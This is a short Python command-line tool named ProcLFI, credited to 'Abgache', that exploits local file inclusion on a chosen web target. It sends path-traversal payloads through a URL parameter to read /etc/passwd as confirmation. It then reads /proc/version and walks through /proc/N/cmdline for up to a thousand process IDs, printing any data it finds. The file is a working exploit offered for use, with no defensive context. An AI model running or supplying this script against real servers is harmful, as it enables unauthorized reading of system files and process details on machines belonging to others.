#!/usr/bin/env python3
import requests
import argparse

def print_banner():
    banner = r"""      _____                _       _____ 
     |  __ \              | |     / ____|
     | |__) | __ ___   ___| |    | (___  
     |  ___/ '__/ _ \ / __| |     \___ \ 
     | |   | | | (_) | (__| |____ ____) |
     |_|   |_|  \___/ \___|______|_____/
         """
    version = "1.0.2"
    credit = f"{' ' * 25}By Abgache\n{' ' * 25}Version: {version}\n"
    print(banner, end="")
    print(credit)

def main():
    parser = argparse.ArgumentParser(description="LFI /proc enumerator")
    parser.add_argument("target", help="IP or domain")
    parser.add_argument("-p", "--port", default=80, type=int)
    parser.add_argument("-s", "--path", default="", help="LFI base path")
    parser.add_argument("--max", default=1000, type=int)
    parser.add_argument("--param", default="file", help="LFI parameter name")

    args = parser.parse_args()

    if not args.target.startswith("http") and not args.target.startswith("https"):
        protocol = "https" if args.port == 443 else "http"
        base = f"{protocol}://{args.target}:{args.port}"
    elif args.target.startswith("http"):
        base = f"{args.target}:{args.port}"
    elif args.target.startswith("https"):
        base = f"{args.target}:{args.port}"

    bad_keywords = [
        "no such file",
        "page not found",
        "404",
        "error",
        "warning",
    ]

    print(f"[*] Target: {base}")

    test_url = f"{base}/{args.path}?{args.param}=../../../../etc/passwd"
    test = requests.get(test_url, timeout=3)

    if "root:x:" not in test.text:
        print("[-] LFI not confirmed (or filtered)")
        return
    else:
        print("[+] LFI confirmed")

    ver_url = f"{base}/{args.path}?{args.param}=../../../../proc/version"
    ver = requests.get(ver_url, timeout=3)
    print(f"[*] OS Version: {ver.text.strip()}\n")

    for i in range(1, args.max + 1):
        url = f"{base}/{args.path}?{args.param}=../../../../proc/{i}/cmdline"

        try:
            r = requests.get(url, timeout=3)

            content = r.text.strip().lower()
            if r.ok and r.text.strip() and content and not any(b in content for b in bad_keywords):
                print(f"\r[+] /proc/{i}/cmdline -> {r.text[:200]}")
            else:
                print(f"\r[-] /proc/{i}/cmdline -> No data", end="")

        except requests.RequestException:
            continue

if __name__ == "__main__":
    print_banner()
    main()